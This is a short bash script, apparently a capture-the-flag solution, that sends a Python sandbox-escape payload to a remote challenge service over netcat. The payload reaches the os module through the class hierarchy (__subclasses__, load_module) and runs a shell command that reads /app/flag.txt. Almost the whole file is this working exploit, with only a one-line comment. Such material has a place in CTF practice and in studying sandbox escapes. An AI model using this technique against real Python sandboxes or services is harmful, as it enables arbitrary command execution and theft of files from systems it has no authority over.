#!/bin/bash

# Many things work, though going through the class hierarchy is a pretty classic approach:
echo "().__class__.__base__.__subclasses__()[84].load_module('os').system('cat /app/flag.txt')" | nc rmrfslash.xyz 8004
